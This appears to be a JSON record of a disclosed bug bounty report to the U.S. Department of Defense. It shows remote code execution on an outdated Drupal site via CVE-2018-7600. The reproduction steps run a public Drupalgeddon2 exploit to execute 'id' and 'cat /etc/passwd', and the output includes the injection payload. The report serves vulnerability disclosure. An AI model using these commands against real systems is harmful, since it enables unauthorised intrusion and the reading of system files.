@@ -1,0 +1,120 @@
+{
+  "id": 1063256,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDYzMjU2",
+  "url": "https://hackerone.com/reports/1063256",
+  "title": "[CVE-2018-7600] Remote Code Execution due to outdated Drupal server on www.█████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2020-12-21T07:51:14.157Z",
+  "submitted_at": "2020-12-21T07:51:14.165Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "0x0d0",
+    "url": "/0x0d0",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/7wu3mzp4ed980h038c52v1c5ut1s/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-7600"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-03-24T20:24:17.881Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-03-24T06:06:51.727Z",
+  "team_member_agreed_on_going_public_at": "2021-03-24T20:24:17.762Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary \nDue to an outdated Drupal version, remote code execution is possible on `www.█████` via CVE-2018-7600. \n\n## Description\nDrupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations. \n\nVulnerable Host:\n * `www.███`\n\nVisiting `https://www.███/███` we can see that we have a Drupal with version 7.54, which was updated the last time in 2017-02-01.\n\nThere are several critical and highly critical vulnerabilities known for this version (see `https://api.drupal.org/api/drupal/████████/7.x` and `https://www.drupal.org/security`). Among them is `SA-CORE-2018-002` (CVE-2018-7600), which I will demonstrate here. \n\nNote: I am reporting this here, since the page `https://www.███████` seems to belong to the █████████, which belongs to the DOD. The footer further states: `██████. [...]`\n\n## Step-by-step Reproduction Instructions\n\n1. Download the git repository with the exploit: `git clone https://github.com/dreadlocked/Drupalgeddon2.git && cd Drupalgeddon2`\n    * Install dependencies if necessary `gem install nokogiri`\n\n2. Run the exploit with ruby `ruby drupalgeddon2-customizable-beta.rb -u https://www.████████/ -v 7 -c id --form user/login`\n\nParameters explanation: \n```\n-u,     --url URL           Service URL\n-v,     --version VERSION   Target Drupal version {7,8}\n-c,     --command COMMAND   Command to execute\n--form  Form to attack, by default '/user/password' in Drupal 7 \n```\nThe above command outputs:\n```\nroot@5b08dc005375:/Drupalgeddon2# ruby drupalgeddon2-customizable-beta.rb -u https://www.████/ -v 7 -c id --form user/login\ndrupalgeddon2-customizable-beta.rb:184: warning: URI.escape is obsolete\n[i] Requesting: www.███████//user/password/?name[%23post_render][]=passthru&name[%23markup]=id&name[%23type]=markup\n[i] POST: form_id=user_pass&_triggering_element_name=name\n[i] 200\n[*] Obtained build id!: ████████\ndrupalgeddon2-customizable-beta.rb:220: warning: URI.escape is obsolete\ndrupalgeddon2-customizable-beta.rb:221: warning: URI.escape is obsolete\n[i] Requesting: www.█████/file/ajax/name/%23value/██████\n[i] POST: form_build_id=█████\n[i] Response code: 200\nuid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0\nroot@5b08dc005375:/Drupalgeddon2# \n```\nAs we can see, we successfully executed the `id` command, which responded with `uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0`\n\nI am also providing the output of `/etc/passwd` which I obtained with command \n```\nruby drupalgeddon2-customizable-beta.rb -u https://www.██████/ -v 7 -c \"cat /etc/passwd\" --form user/login\n```\nOutput: \n```\n████\n██████\n███████\n████████\n█████████\n█████████\n██████████\n███\n████\n█████████\n██████████\n████\n██████████\n████████ █████\n█████████\n██████████\n████████\n██████████\n██████\n████\n█████████\n███████\n███████\n████\n██████████\n███\n█████\n█████\n██████\n```\n\n## Resources\n * https://api.drupal.org/api/drupal/█████/7.x\n * https://www.drupal.org/security\n * https://github.com/dreadlocked/Drupalgeddon2\n * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600\n * https://www.drupal.org/sa-core-2018-002\n\n## Mitigation/Remediation Actions\nUpgrade to the most recent version of Drupal 7 core.\n\n## Impact\n\nCritical - Remote Code Execution",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 19,
+  "voters": [
+    "0x0d0",
+    "ali",
+    "0xelkomy",
+    "lesleybw",
+    "dastan_9408",
+    "sa1tama0",
+    "mohammedadam24",
+    "410brb",
+    "djmarcos",
+    "bosbosbos",
+    "and 9 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
